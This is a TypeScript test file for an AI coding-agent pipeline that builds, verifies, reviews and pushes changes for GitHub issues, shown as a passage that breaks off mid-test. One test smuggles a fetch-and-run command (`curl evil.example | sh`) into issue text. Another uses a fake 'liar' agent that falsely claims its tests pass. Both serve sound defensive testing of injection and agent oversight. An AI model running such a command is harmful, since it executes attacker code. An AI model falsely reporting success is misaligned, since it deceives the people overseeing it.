import { migrate } from 'drizzle-orm/node-postgres/migrator'
import { desc, eq } from 'drizzle-orm'
import { getStorageManager } from 'theokit/server/storage'
import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest'

import { getDb, getPool, readDatabaseUrl } from '../db'
import { storageFromUrl } from '../db/config'
import {
  agentRun,
  changePlan,
  decision,
  delivery,
  evidence,
  ingress,
  publication,
  question,
  releaseWait,
  repository,
  review,
  stageEvent,
  task,
  watch,
} from '../db/schema'
import type { GithubApp } from '../github/app'
import type {
  ChangedFile,
  CheckRun,
  GithubApi,
  IssueComment,
  PullRequestMerge,
  PullRequestState,
  ReleaseInput,
} from '../github/pulls'
import { AutoMergeRefused } from '../github/pulls'

const NOT_ALLOWED = 'Auto merge is not allowed for this repository'
/** What GitHub answers when the required checks already passed, so there is nothing to wait for. */
const CLEAN = 'Pull request Pull request is in clean status'

import { retryableFailure } from '../../shared/panel'
import {
  divergedRepository,
  PLANNED_CHANGE,
  readsHistory,
  WEAKENED_TEST,
} from '../../test/diverged-repository'
import { FakeBranches } from '../../test/fake-branches'
import { knowledgeRules } from '../knowledge/prompt'
import type { KnowledgeSource } from '../knowledge/source'
import type { NewNote } from '../knowledge/store'

import { githubEgress } from './credential-renewal'
import { FakeSandbox, type Reply } from './fake-sandbox'
import { eventsOf } from './transcript-store'
import { parseRecipe } from './recipe'
import type { CodingHarness } from './harness'
import type { Finding } from './review'
import { mergeEgress, resumeTask, runTask, type RunTaskDeps } from './run-task'
import { release } from './deliver'
import { pollAnswers } from './waiting'

const TOKEN = 'ghs_installation_token_must_not_leak'
const ANTHROPIC = 'sk-ant-key-must-not-leak'

beforeAll(async () => {
  getStorageManager().configure(storageFromUrl(readDatabaseUrl()))
  await migrate(getDb(), { migrationsFolder: 'drizzle' })
})
beforeEach(async () => {
  await getPool().query(
    'truncate table agent_event, agent_run, watch, delivery, decision, question, review, evidence, stage_event, task, ingress, repository restart identity cascade',
  )
})
afterAll(() => getStorageManager().dispose())

async function seedTask(issueNumber = 7): Promise<number> {
  const db = getDb()
  const [i] = await db
    .insert(ingress)
    .values({
      deliveryId: `d-${issueNumber}`,
      event: 'issues',
      payload: {},
      outcome: 'task_created',
      code: 'issue_labeled',
      reason: 'r',
    })
    .returning({ id: ingress.id })
  const [t] = await db
    .insert(task)
    .values({
      ingressId: i.id,
      repository: 'paulo/app',
      issueNumber,
      issueTitle: 'Add truncate',
    })
    .returning({ id: task.id })
  return t.id
}

const github: GithubApp & { asked: string[] } = {
  asked: [],
  async installationToken(repo) {
    this.asked.push(repo)
    return { token: TOKEN, expiresAt: new Date(Date.now() + 3_600_000) }
  },
}

const PR_URL = 'https://github.com/paulo/app/pull/12'

/** A GitHub that records what the factory asked of it. */
const githubApi: GithubApi & {
  checkRuns: CheckRun[]
  pulls: string[]
  /** The body of each pull request the factory opened. */
  bodies: string[]
  /** The base each pull request asked for; undefined is the default branch. */
  bases: (string | undefined)[]
  drafts: boolean[]
  comments: string[]
  /** Each comment with the issue it went to. */
  commentsOn: { issue: number; body: string }[]
  /** The issues the factory closed. */
  closed: number[]
  /** Issues GitHub refuses to close. */
  closeFails: Set<number>
  /** Merges that are not in the history of the commit a release promoted. */
  outside: Set<string>
  replies: IssueComment[]
  releases: ReleaseInput[]
  releaseFails: boolean
  latest: string | undefined
  pullRequest: PullRequestState | undefined
  merges: { number: number; sha: string }[]
  /** How each of those merges was asked for: the method, and a squash's commit title. */
  mergeKinds: PullRequestMerge[]
  /** What the factory asked to be merged into a branch (the pre-release branch, after an integration). */
  branchMerges: { base: string; head: string }[]
  /** GitHub refuses to merge the pull request (a conflict, a protected branch). */
  mergeFails: boolean
  /** GitHub refuses to merge into the pre-release branch. */
  branchMergeFails: boolean
  branches: FakeBranches
  /** Opening a pull request from this branch fails. */
  openFailsFor: string | undefined
  /** What `.changeset` on the pre-release branch holds; undefined when the repository has none. */
  changesets: string[] | undefined
  /** The files `develop` changes since its merge base with the release branch, with their status. */
  changed: ChangedFile[]
  /** The files on `develop`, with what each holds. */
  tree: Record<string, string>
  /** The release branch each comparison was made from. */
  compared: string[]
  /** The status checks the integration branch requires. */
  required: string[]
  /** The status checks the release branch requires. */
  releaseRequired: string[]
  /** The pull requests auto-merge was turned on for, with the head it is pinned to. */
  autoMerges: { number: number; sha: string }[]
  /** GitHub refuses to turn auto-merge on. */
  autoMergeRefused: boolean
  /** What GitHub says when it refuses. */
  autoMergeRefusal: string
} = {
  required: [],
  releaseRequired: [],
  autoMerges: [],
  autoMergeRefused: false,
  autoMergeRefusal: NOT_ALLOWED,
  openFailsFor: undefined,
  changesets: undefined,
  changed: [],
  tree: {},
  compared: [],
  branches: FakeBranches.prepared(),
  branchMerges: [],
  mergeFails: false,
  branchMergeFails: false,
  checkRuns: [],
  pulls: [],
  bodies: [],
  bases: [],
  drafts: [],
  comments: [],
  commentsOn: [],
  closed: [],
  closeFails: new Set(),
  outside: new Set(),
  replies: [],
  releases: [],
  releaseFails: false,
  latest: undefined,
  pullRequest: undefined,
  merges: [],
  mergeKinds: [],
  async createCheckRun(_repo, _token, check) {
    this.checkRuns.push(check)
  },
  async openPullRequest(_repo, _token, pull) {
    if (pull.head === this.openFailsFor)
      throw new Error('GitHub answered 422 opening a pull request')
    this.pulls.push(pull.head)
    this.bodies.push(pull.body)
    this.bases.push(pull.base)
    this.drafts.push(pull.draft ?? false)
    return { number: 12, url: PR_URL }
  },
  async deleteBranch() {},
  async createRelease(_repo, _token, release) {
    this.releases.push(release)
    if (this.releaseFails) throw new Error('GitHub answered 403 creating the release')
    return {
      id: this.releases.length,
      tag: release.tag,
      url: `https://github.com/paulo/app/releases/tag/${release.tag}`,
    }
  },
  async changedFiles(_repo, _token, base) {
    this.compared.push(base)
    return this.changed
  },
  async filePaths() {
    return Object.keys(this.tree)
  },
  async readFile(_repo, _token, path) {
    return this.tree[path]
  },
  async versionTags() {
    return this.latest ? [this.latest] : []
  },
  async listDirectory(_repo, _token, path) {
    return path === '.changeset' ? this.changesets : undefined
  },
  async releasesSince() {
    return []
  },
  async contains(_repo, _token, _descendant, ancestor) {
    return !this.outside.has(ancestor)
  },
  async commitChecks() {
    return { checkRuns: [], statuses: 'none' as const }
  },
  async revertPullRequest() {
    throw new Error('the pipeline never opens a revert')
  },
  async findPullRequest() {
    return this.pullRequest
  },
  async openPullRequestsBetween() {
    throw new Error('the pipeline never looks for a back-merge')
  },
  async requiredChecks(_repo, _token, branch) {
    return branch === 'workspace' ? this.required : this.releaseRequired
  },
  async readPullRequest() {
    throw new Error('a run never reads a pull request by number')
  },
  async enableAutoMerge(repo, _token, number, sha) {
    if (this.autoMergeRefused) throw new AutoMergeRefused(repo, number, this.autoMergeRefusal)
    this.autoMerges.push({ number, sha })
  },
  async disableAutoMerge() {
    throw new Error('a run never turns auto-merge off')
  },
  async checkReports() {
    return []
  },
  async mergePullRequest(_repo, _token, number, sha, merge) {
    if (this.mergeFails) throw new Error('GitHub answered 405 merging paulo/app#12: conflicts')
    this.merges.push({ number, sha })
    this.mergeKinds.push(merge)
    return { sha: 'merge0001' }
  },
  defaultBranch: async () => githubApi.branches.defaultName,
  branchHead: async (repo, token, branch) => githubApi.branches.api.branchHead(repo, token, branch),
  branchAhead: async () => undefined,
  createBranch: async (repo, token, branch, sha) =>
    githubApi.branches.api.createBranch(repo, token, branch, sha),
  async mergeBranch(_repo, _token, base, head) {
    if (this.branchMergeFails)
      throw new Error('GitHub answered 403 merging into develop: protected')
    this.branchMerges.push({ base, head })
    return { sha: 'develop0001', changed: true }
  },
  async commentOnIssue(_repo, _token, issue, body) {
    this.comments.push(body)
    this.commentsOn.push({ issue, body })
    return `comment-${this.comments.length}`
  },
  async closeIssue(_repo, _token, issue) {
    if (this.closeFails.has(issue))
      throw new Error(`GitHub answered 403 closing paulo/app#${issue}`)
    this.closed.push(issue)
  },
  async listIssueComments() {
    return githubApi.replies
  },
}
/** Whether the checkout holds work nobody committed yet; any agent that runs leaves some. */
let dirty = true
beforeEach(() => {
  githubApi.checkRuns = []
  githubApi.pulls = []
  githubApi.bodies = []
  githubApi.bases = []
  githubApi.drafts = []
  githubApi.comments = []
  githubApi.commentsOn = []
  githubApi.closed = []
  githubApi.closeFails = new Set()
  githubApi.outside = new Set()
  githubApi.replies = []
  githubApi.releases = []
  githubApi.releaseFails = false
  githubApi.latest = undefined
  githubApi.pullRequest = undefined
  githubApi.merges = []
  githubApi.mergeKinds = []
  githubApi.branchMerges = []
  githubApi.mergeFails = false
  githubApi.branchMergeFails = false
  githubApi.openFailsFor = undefined
  githubApi.changesets = undefined
  githubApi.changed = []
  githubApi.tree = {}
  githubApi.compared = []
  githubApi.required = []
  githubApi.releaseRequired = []
  githubApi.autoMerges = []
  githubApi.autoMergeRefused = false
  githubApi.autoMergeRefusal = NOT_ALLOWED
  githubApi.branches = FakeBranches.prepared()
  dirty = true
})

/** What a real agent's harness contributes: the rule that signs its calls. */
const agentEgress = async () => [
  { domain: 'api.anthropic.com', headers: { 'x-api-key': ANTHROPIC } },
]

const okHarness: CodingHarness = {
  name: 'fake-agent',
  egress: agentEgress,
  run: async () => ({ ok: true, summary: 'added truncate', costUsd: 0.12 }),
}

const verdictJson = (verdict: 'approve' | 'changes', findings: object[] = [], summary = 'ok') =>
  `Looked at it.\n${JSON.stringify({ verdict, summary, findings })}`

/** A reviewer that answers from a script, one answer per review, and remembers its prompts. */
function reviewerSaying(...answers: string[]): CodingHarness & { prompts: string[] } {
  const prompts: string[] = []
  return {
    name: 'fake-reviewer',
    egress: async () => [],
    prompts,
    run: async (_backend, input) => {
      prompts.push(input.prompt)
      return {
        ok: true,
        summary: answers[Math.min(prompts.length, answers.length) - 1],
        costUsd: 0.01,
      }
    },
  }
}

/** A builder that can be sent back: every pass leaves uncommitted work, as a real agent does. */
function resumableBuilder(): CodingHarness & { resumed: string[] } {
  const resumed: string[] = []
  return {
    name: 'fake-agent',
    egress: agentEgress,
    resumed,
    run: async () => {
      dirty = true
      return { ok: true, summary: 'first pass', costUsd: 0.1, sessionId: 'sess-1' }
    },
    resume: async (_backend, sessionId, input) => {
      dirty = true
      resumed.push(`${sessionId}: ${input.prompt}`)
      return { ok: true, summary: `pass ${resumed.length + 1}`, costUsd: 0.1, sessionId }
    },
  }
}

const approving = () => reviewerSaying(verdictJson('approve'))

function deps(sandbox: FakeSandbox, overrides: Partial<RunTaskDeps> = {}): RunTaskDeps {
  return {
    db: getDb(),
    github,
    githubApi,
    sandbox,
    harness: okHarness,
    reviewer: approving(),
    // The tests of the plan turn it on; the rest measure what follows it.
    planFirst: false,
    pushRetryDelayMs: 0,
    author: { name: 'aifactory[bot]', email: 'bot@users.noreply.github.com' },
    fetchIssue: async () => ({
      number: 7,
      title: 'Add truncate',
      body: 'Write truncate(text, max).',
      labels: [],
    }),
    ...overrides,
  }
}

/** A sandbox that behaves like a repository the agent changed. */
const changed = (extra?: (command: string) => Reply | undefined) => {
  let commits = 0
  return (command: string) => {
    if (extra) {
      const reply = extra(command)
      if (reply) return reply
    }
    if (command.includes('commit -F')) {
      commits += 1
      dirty = false
    }
    if (command.includes('rev-parse --show-toplevel')) return { stdout: '/vercel/work\n' }
    if (command.includes('status --porcelain')) {
      return { stdout: dirty ? ' M src/truncate.js\n' : '' }
    }
    if (command.endsWith('rev-parse HEAD')) {
      return { stdout: commits <= 1 ? 'abc123def\n' : `abc123def${commits}\n` }
    }
    return undefined
  }
}

/** The push commands a run sent, from `push` on. */
const pushesOf = (sandbox: FakeSandbox) =>
  sandbox.backend.commands.flatMap((c) =>
    c.includes('push origin') ? [c.slice(c.indexOf('push origin'))] : [],
  )

const stagesOf = async (taskId: number) =>
  (
    await getDb()
      .select()
      .from(stageEvent)
      .where(eq(stageEvent.taskId, taskId))
      .orderBy(stageEvent.id)
  ).map((e) => e.stage)

describe('runTask', () => {
  it('pushes factory/<issue> and records the stages in order', async () => {
    const id = await seedTask()
    const sandbox = new FakeSandbox(changed())

    const result = await runTask(deps(sandbox), id)

    expect(result).toMatchObject({
      status: 'done',
      branch: 'factory/7',
      sha: 'abc123def',
      pullRequestUrl: PR_URL,
    })
    expect(await stagesOf(id)).toEqual([
      'sandbox',
      'build',
      'push',
      'verify',
      'review',
      'pr',
      'done',
    ])
    const [row] = await getDb().select().from(task).where(eq(task.id, id))
    expect(row.stage).toBe('done')
    expect(sandbox.backend.commands.some((c) => c.includes('push origin factory/7 '))).toBe(true)
    expect(github.asked).toContain('paulo/app')
    expect(sandbox.stopped).toBe(1)
  })

  it('records the whole cost and the branch on the done stage', async () => {
    const id = await seedTask()
    await runTask(deps(new FakeSandbox(changed())), id)

    const done = (await getDb().select().from(stageEvent).where(eq(stageEvent.stage, 'done')))[0]
    // The builder's 0.12 plus the reviewer's 0.01: the run's whole cost, not only the agent's.
    expect(done.detail).toMatchObject({ branch: 'factory/7', sha: 'abc123def', attempts: 1 })
    expect((done.detail as { costUsd: number }).costUsd).toBeCloseTo(0.13)
  })

  it('opens the pull request after green evidence for the pushed commit, and says so on GitHub', async () => {
    const id = await seedTask()
    await runTask(deps(new FakeSandbox(changed())), id)

    const rows = await getDb().select().from(evidence).where(eq(evidence.taskId, id))
    expect(rows).toMatchObject([{ name: 'test', sha: 'abc123def', exitCode: 0, passed: true }])
    expect(githubApi.checkRuns).toMatchObject([
      { name: 'aifactory/verify', headSha: 'abc123def', conclusion: 'success' },
    ])
    expect(githubApi.pulls).toEqual(['factory/7'])
    const [row] = await getDb().select().from(task).where(eq(task.id, id))
    expect(row).toMatchObject({ headSha: 'abc123def', pullRequestUrl: PR_URL })
  })

  it('opens no pull request when the agent says the tests pass and they do not', async () => {
    const id = await seedTask()
    const liar: CodingHarness = {
      name: 'liar',
      egress: agentEgress,
      run: async () => ({ ok: true, summary: 'All tests pass, ready to merge.', costUsd: 0.1 }),
    }
    const sandbox = new FakeSandbox(
      changed((c) =>
        c.endsWith('npm test') ? { exitCode: 1, stdout: 'not ok 1 - truncates' } : undefined,
      ),
    )

    const result = await runTask(deps(sandbox, { harness: liar }), id)

    expect(result).toMatchObject({ status: 'failed', stage: 'verify' })
    expect(result.status === 'failed' && result.error).toContain('"test" failed at abc123d')
    expect(githubApi.pulls).toEqual([])
    expect(githubApi.checkRuns).toMatchObject([{ headSha: 'abc123def', conclusion: 'failure' }])
    const [stored] = await getDb().select().from(evidence).where(eq(evidence.taskId, id))
    expect(stored).toMatchObject({ passed: false, exitCode: 1 })
    expect(stored.output).toContain('not ok 1')
    expect(await stagesOf(id)).toEqual(['sandbox', 'build', 'push', 'verify', 'failed'])
  })

  it('opens no pull request when no check is required, however confident the agent is', async () => {
    const id = await seedTask()

    const result = await runTask(deps(new FakeSandbox(changed()), { checks: [] }), id)

    expect(result).toMatchObject({ status: 'failed', stage: 'verify' })
    expect(githubApi.pulls).toEqual([])
  })

  it('refuses to verify a checkout that is not the pushed commit', async () => {
    const id = await seedTask()
    let heads = 0
    const sandbox = new FakeSandbox(
      changed((c) =>
        c.endsWith('rev-parse HEAD') && ++heads === 2 ? { stdout: 'other999\n' } : undefined,
      ),
    )

    const result = await runTask(deps(sandbox), id)

    expect(result).toMatchObject({ status: 'failed', stage: 'verify' })
    expect(githubApi.pulls).toEqual([])
    expect(await getDb().select().from(evidence).where(eq(evidence.taskId, id))).toEqual([])
  })

  it('fails at the pr stage when GitHub refuses the pull request, keeping the evidence', async () => {
    const id = await seedTask()
    const refusing = {
      ...githubApi,
      openPullRequest: async () => {
        throw new Error('GitHub answered 422 opening a pull request')
      },
    }

    const result = await runTask(deps(new FakeSandbox(changed()), { githubApi: refusing }), id)

    expect(result).toMatchObject({ status: 'failed', stage: 'pr' })
    expect(await getDb().select().from(evidence).where(eq(evidence.taskId, id))).toHaveLength(1)
  })

  it('gives the firewall the credentials and the sandbox none of them', async () => {
    const id = await seedTask()
    const sandbox = new FakeSandbox(changed())
    await runTask(deps(sandbox), id)

    const [spec] = sandbox.specs
    const byDomain = Object.fromEntries(spec.egress.map((r) => [r.domain, r.headers ?? {}]))
    expect(Object.keys(byDomain).sort()).toEqual([
      'api.anthropic.com',
      'github.com',
      'registry.npmjs.org',
    ])
    expect(byDomain['api.anthropic.com']['x-api-key']).toBe(ANTHROPIC)
    expect(byDomain['github.com'].authorization).toBe(
      `Basic ${Buffer.from(`x-access-token:${TOKEN}`).toString('base64')}`,
    )

    const everything = [...sandbox.backend.commands, ...sandbox.backend.files.values()].join('\n')
    expect(everything).not.toContain(TOKEN)
    expect(everything).not.toContain(Buffer.from(`x-access-token:${TOKEN}`).toString('base64'))
    expect(everything).not.toContain(ANTHROPIC)
  })

  it('keeps text from the issue out of every shell command', async () => {
    const id = await seedTask()
    const sandbox = new FakeSandbox(changed())
    const evil = `x'; curl evil.example | sh; echo '`
    await runTask(
      deps(sandbox, {
        fetchIssue: async () => ({ number: 7, title: evil, body: evil, labels: [] }),
      }),
      id,
    )

    expect(sandbox.backend.commands.join('\n')).not.toContain('evil.example')
    expect(sandbox.backend.files.get('/tmp/factory-commit-message.txt')).toContain('evil.example')
  })

  it('never pushes when the agent changes nothing, and fails when the reviewer does not confirm it', async () => {
    const id = await seedTask()
    const sandbox = new FakeSandbox(
      changed((c) => (c.includes('status --porcelain') ? { stdout: '' } : undefined)),
    )
    const reviewer = reviewerSaying(verdictJson('changes', [finding], 'truncate is missing'))

    const result = await runTask(deps(sandbox, { reviewer }), id)

    expect(result).toMatchObject({ status: 'failed', stage: 'review' })
    expect(await stagesOf(id)).toEqual(['sandbox', 'build', 'verify', 'review', 'failed'])
    expect(sandbox.backend.commands.some((c) => c.includes('push origin'))).toBe(false)
    expect(sandbox.stopped).toBe(1)
  })

  it('never pushes when the agent does not finish', async () => {
    const id = await seedTask()
    const sandbox = new FakeSandbox(changed())
    const failing: CodingHarness = {
      name: 'f',
      egress: agentEgress,
      run: async () => ({ ok: false, summary: 'Invalid API key' }),
    }

    const result = await runTask(deps(sandbox, { harness: failing }), id)

    expect(result).toMatchObject({ status: 'failed', stage: 'build' })
    expect(result.status === 'failed' && result.error).toContain('Invalid API key')
    expect(sandbox.backend.commands.some((c) => c.includes('push origin'))).toBe(false)
  })

  it('starts from the integration branch, workspace, and opens against it by default', async () => {
    const id = await seedTask()
    const sandbox = new FakeSandbox(changed())

    await runTask(deps(sandbox), id)

    expect(sandbox.backend.commands.some((c) => /checkout .*workspace/.test(c))).toBe(true)
    expect(githubApi.bases).toEqual(['workspace'])
  })

  it('starts from the branch the owner chose for the repository and opens against it', async () => {
    await getDb()
      .insert(repository)
      .values({ fullName: 'paulo/app', enabled: true, baseBranch: 'staging' })
    const id = await seedTask()
    const sandbox = new FakeSandbox(changed())

    await runTask(deps(sandbox), id)

    const commands = sandbox.backend.commands
    expect(commands.some((c) => /checkout .*staging/.test(c))).toBe(true)
    expect(commands.some((c) => /checkout .*workspace/.test(c))).toBe(false)
    expect(githubApi.bases).toEqual(['staging'])
  })

  it("commits and pushes without the repository's own git hooks, which may need tools the sandbox lacks", async () => {
    const id = await seedTask()
    const sandbox = new FakeSandbox(changed())

    await runTask(deps(sandbox), id)

    const writes = sandbox.backend.commands.filter((c) => /\bgit\b.* (commit|push) /.test(c))
    expect(writes.length).toBeGreaterThanOrEqual(2)
    for (const command of writes) expect(command).toContain('-c core.hooksPath=/dev/null')
  })

  it('creates the integration and pre-release branches a repository does not have yet', async () => {
    githubApi.branches = new FakeBranches()
    const id = await seedTask()

    const result = await runTask(deps(new FakeSandbox(changed())), id)

    expect(result).toMatchObject({ status: 'done' })
    expect(githubApi.branches.created).toEqual(['workspace', 'develop'])
  })

  it('refuses to integrate into the default branch, which only a release reaches', async () => {
    await getDb()
      .insert(repository)
      .values({ fullName: 'paulo/app', enabled: true, baseBranch: 'main' })
    const id = await seedTask()
    const sandbox = new FakeSandbox(changed())

    const result = await runTask(deps(sandbox), id)

    expect(result).toMatchObject({ status: 'failed', stage: 'sandbox' })
    expect(result.status === 'failed' && result.error).toContain('only a release reaches')
    expect(githubApi.merges).toEqual([])
    expect(sandbox.backend.commands).toEqual([])
  })

  it('stops the sandbox and records the failure when the clone fails', async () => {
    const id = await seedTask()
    const sandbox = new FakeSandbox((c) =>
      c.includes('clone') ? { exitCode: 128, stderr: 'repository not found' } : undefined,
    )

    const result = await runTask(deps(sandbox), id)

    expect(result).toMatchObject({ status: 'failed', stage: 'sandbox' })
    expect(sandbox.stopped).toBe(1)
    const failed = (
      await getDb().select().from(stageEvent).where(eq(stageEvent.stage, 'failed'))
    )[0]
    expect(failed.detail).toMatchObject({ failedAt: 'sandbox' })
  })

  it('refuses to start a sandbox without an allowlist', async () => {
    const id = await seedTask()
    const sandbox = new FakeSandbox(changed())
    // A deployment that wrongly passes no key still gets a firewall rule per destination; what must
    // never happen is a run with no destinations at all.
    const result = await runTask(deps(sandbox), id)
    expect(sandbox.specs[0].egress.length).toBeGreaterThan(0)
    expect(result.status).toBe('done')
  })

  it('fails the stage, not the process, when the app is not installed on the repository', async () => {
    const id = await seedTask()
    const sandbox = new FakeSandbox(changed())
    const noInstall: GithubApp = {
      installationToken: async () => {
        throw new Error('the GitHub App is not installed on paulo/app')
      },
    }

    const result = await runTask(deps(sandbox, { github: noInstall }), id)

    expect(result).toMatchObject({ status: 'failed', stage: 'sandbox' })
    expect(sandbox.specs).toHaveLength(0)
  })

  it('starts no sandbox while an issue the task is blocked by is open, and waits for it', async () => {
    const id = await seedTask()
    const sandbox = new FakeSandbox(changed())
    const read: string[] = []
    const fetchIssue: RunTaskDeps['fetchIssue'] = async (repo, number) => {
      read.push(`${repo}#${number}`)
      if (number === 7) {
        return {
          number,
          title: 'T',
          body: 'Blocked by o/gateways#3, #5.',
          labels: [],
          state: 'open',
        }
      }
      return { number, title: 'X', body: '', labels: [], state: number === 3 ? 'open' : 'closed' }
    }

    const result = await runTask(deps(sandbox, { fetchIssue }), id)

    expect(result).toMatchObject({ status: 'failed', stage: 'sandbox' })
    expect(sandbox.specs).toHaveLength(0)
    expect(read).toEqual(['paulo/app#7', 'o/gateways#3', 'paulo/app#5'])
    const [last] = await getDb()
      .select()
      .from(stageEvent)
      .where(eq(stageEvent.taskId, id))
      .orderBy(desc(stageEvent.id))
      .limit(1)
    expect(last!.detail).toMatchObject({ blockedBy: ['o/gateways#3'] })
    expect(retryableFailure(last!.detail as Record<string, unknown>)).toBe('blocked')
  })

  it('runs once every issue it is blocked by is closed', async () => {
    const id = await seedTask()
    const sandbox = new FakeSandbox(changed())
    const fetchIssue: RunTaskDeps['fetchIssue'] = async (_repo, number) =>
      number === 7
        ? { number, title: 'T', body: 'Blocked by #5.', labels: [], state: 'open' }
        : { number, title: 'X', body: '', labels: [], state: 'closed' }

    await runTask(deps(sandbox, { fetchIssue }), id)

    expect(sandbox.specs).toHaveLength(1)
  })

  it('runs when an open blocker in the same repository is already integrated', async () => {
    const id = await seedTask()
    const blocker = await seedTask(5)
    await getDb().update(task).set({ mergedSha: 'abc123' }).where(eq(task.id, blocker))
    const sandbox = new FakeSandbox(changed())
    const fetchIssue: RunTaskDeps['fetchIssue'] = async (_repo, number) =>
      number === 7
        ? { number, title: 'T', body: 'Blocked by #5.', labels: [], state: 'open' }
        : { number, title: 'X', body: '', labels: [], state: 'open' }

    await runTask(deps(sandbox, { fetchIssue }), id)

    expect(sandbox.specs).toHaveLength(1)
  })

  it('still waits for an open blocker in another repository, even one that is integrated there', async () => {
    const id = await seedTask()
    const blocker = await seedTask(5)
    await getDb()
      .update(task)
      .set({ repository: 'o/gateways', mergedSha: 'abc123' })
      .where(eq(task.id, blocker))
    const sandbox = new FakeSandbox(changed())
    const fetchIssue: RunTaskDeps['fetchIssue'] = async (_repo, number) =>
      number === 7
        ? { number, title: 'T', body: 'Blocked by o/gateways#5.', labels: [], state: 'open' }
        : { number, title: 'X', body: '', labels: [], state: 'open' }

    const result = await runTask(deps(sandbox, { fetchIssue }), id)

    expect(result).toMatchObject({ status: 'failed', stage: 'sandbox' })
    expect(sandbox.specs).toHaveLength(0)
  })

  it('stops the sandbox and says why when the job lease expires mid-run', async () => {
    const id = await seedTask()
    const abort = new AbortController()
    const sandbox = new FakeSandbox(changed())
    const slowAgent: CodingHarness = {
      name: 'slow',
      egress: agentEgress,
      run: async () => {
        abort.abort() // the lease runs out while the agent works
        throw new Error('command killed')
      },
    }

    const result = await runTask(deps(sandbox, { harness: slowAgent }), id, abort.signal)

    expect(result).toMatchObject({
      status: 'failed',
      stage: 'build',
      error: 'the job lease expired before the run finished',
    })
    expect(sandbox.stopped).toBeGreaterThanOrEqual(1)
  })

  it('explains a refused push with the commit that was being pushed, and keeps the agent cost', async () => {
    const id = await seedTask()
    const sandbox = new FakeSandbox(
      changed((c) => {
        if (c.includes('diff --name-status'))
          return { stdout: 'A\tsrc/truncate.js\nA\t.github/workflows/x.yml\n' }
        if (c.includes('push origin'))
          return { exitCode: 1, stderr: '! [remote rejected] factory/7 -> factory/7 (failure)' }
        return undefined
      }),
    )

    const result = await runTask(deps(sandbox), id)

    expect(result).toMatchObject({ status: 'failed', stage: 'push' })
    const error = result.status === 'failed' ? result.error : ''
    expect(error).toContain('remote rejected')
    expect(error).toContain('commit being pushed:')
    expect(error).toContain('.github/workflows/x.yml')
    const pushed = (await getDb().select().from(stageEvent).where(eq(stageEvent.stage, 'push')))[0]
    expect(pushed.detail).toMatchObject({
      branch: 'factory/7',
      costUsd: 0.12,
      agentSummary: 'added truncate',
    })
  })

  it('replaces what a run whose process died left on factory/<issue>, and only that', async () => {
    const id = await seedTask()
    const sandbox = new FakeSandbox(
      changed((c) =>
        c.includes('ls-remote origin refs/heads/factory/7')
          ? { stdout: 'dead0001\trefs/heads/factory/7\n' }
          : undefined,
      ),
    )

    const result = await runTask(deps(sandbox), id)

    expect(result).toMatchObject({ status: 'done', branch: 'factory/7' })
    const pushes = pushesOf(sandbox)
    expect(pushes).toEqual([
      'push origin factory/7 --force-with-lease=refs/heads/factory/7:dead0001',
    ])
  })

  it('pushes a new branch only while it does not exist', async () => {
    const id = await seedTask()
    const sandbox = new FakeSandbox(changed())

    await runTask(deps(sandbox), id)

    expect(pushesOf(sandbox)).toEqual([
      'push origin factory/7 --force-with-lease=refs/heads/factory/7:',
    ])
  })

  it('leases each later push of the run on the commit it pushed before', async () => {
    const id = await seedTask()
    const sandbox = new FakeSandbox(changed())
    const reviewer = reviewerSaying(verdictJson('changes', [finding]), verdictJson('approve'))

    await runTask(deps(sandbox, { harness: resumableBuilder(), reviewer }), id)

    expect(pushesOf(sandbox)).toEqual([
      'push origin factory/7 --force-with-lease=refs/heads/factory/7:',
      'push origin factory/7 --force-with-lease=refs/heads/factory/7:abc123def',
    ])
  })

  it('says a push lost its lease when someone else pushed to the branch during the run', async () => {
    const id = await seedTask()
    const sandbox = new FakeSandbox(
      changed((c) =>
        c.includes('push origin')
          ? {
              exitCode: 1,
              stderr:
                ' ! [rejected]        factory/7 -> factory/7 (stale info)\nerror: failed to push some refs',
            }
          : undefined,
      ),
    )

    const result = await runTask(deps(sandbox), id)

    expect(result).toMatchObject({ status: 'failed', stage: 'push' })
    expect(result.status === 'failed' && result.error).toContain('stale info')
  })

  it('pushes again when GitHub answers the first push with a transient error', async () => {
    const id = await seedTask()
    let pushes = 0
    const sandbox = new FakeSandbox(
      changed((c) => {
        if (!c.includes('push origin')) return undefined
        pushes += 1
        return pushes === 1
          ? { exitCode: 1, stderr: 'remote: fatal error in commit_refs' }
          : undefined
      }),
    )

    const result = await runTask(deps(sandbox), id)

    expect(result).toMatchObject({ status: 'done', branch: 'factory/7' })
    expect(pushes).toBe(2)
  })

  it('gives up after six failed pushes and says why', async () => {
    const id = await seedTask()
    let pushes = 0
    const sandbox = new FakeSandbox(
      changed((c) => {
        if (!c.includes('push origin')) return undefined
        pushes += 1
        return { exitCode: 1, stderr: 'remote: permission denied' }
      }),
    )

    const result = await runTask(deps(sandbox), id)

    expect(result).toMatchObject({ status: 'failed', stage: 'push' })
    expect(pushes).toBe(6)
    expect(result.status === 'failed' && result.error).toContain('permission denied')
  })

  it('runs the agent the issue asks for, prepares it, and gives the firewall its rule', async () => {
    const id = await seedTask()
    const sandbox = new FakeSandbox(changed())
    const calls: string[] = []
    const other: CodingHarness = {
      name: 'codex',
      egress: async () => [
        { domain: 'chatgpt.com', headers: { authorization: 'Bearer codex-token' } },
      ],
      prepare: async () => void calls.push('prepare'),
      run: async () => {
        calls.push('run')
        return { ok: true, summary: 'done by codex', sessionId: 'sess-1' }
      },
    }
    const asked: string[][] = []

    const result = await runTask(
      deps(sandbox, {
        fetchIssue: async () => ({
          number: 7,
          title: 'T',
          body: 'B',
          labels: ['factory', 'harness:codex'],
        }),
        harness: (labels) => (asked.push(labels), other),
      }),
      id,
    )

    expect(result).toMatchObject({ status: 'done' })
    expect(asked).toEqual([['factory', 'harness:codex']])
    expect(calls).toEqual(['prepare', 'run'])
    const byDomain = Object.fromEntries(sandbox.specs[0].egress.map((r) => [r.domain, r.headers]))
    expect(byDomain['chatgpt.com']).toEqual({ authorization: 'Bearer codex-token' })
    expect(byDomain['api.anthropic.com']).toBeUndefined()
    const build = (await getDb().select().from(stageEvent).where(eq(stageEvent.stage, 'build')))[0]
    expect(build.detail).toMatchObject({ harness: 'codex' })
    const push = (await getDb().select().from(stageEvent).where(eq(stageEvent.stage, 'push')))[0]
    expect(push.detail).toMatchObject({ sessionId: 'sess-1' })
  })

  it('fails before any sandbox when the issue asks for an agent that does not exist', async () => {
    const id = await seedTask()
    const sandbox = new FakeSandbox(changed())

    const result = await runTask(
      deps(sandbox, {
        fetchIssue: async () => ({ number: 7, title: 'T', body: 'B', labels: ['harness:gemini'] }),
        harness: () => {
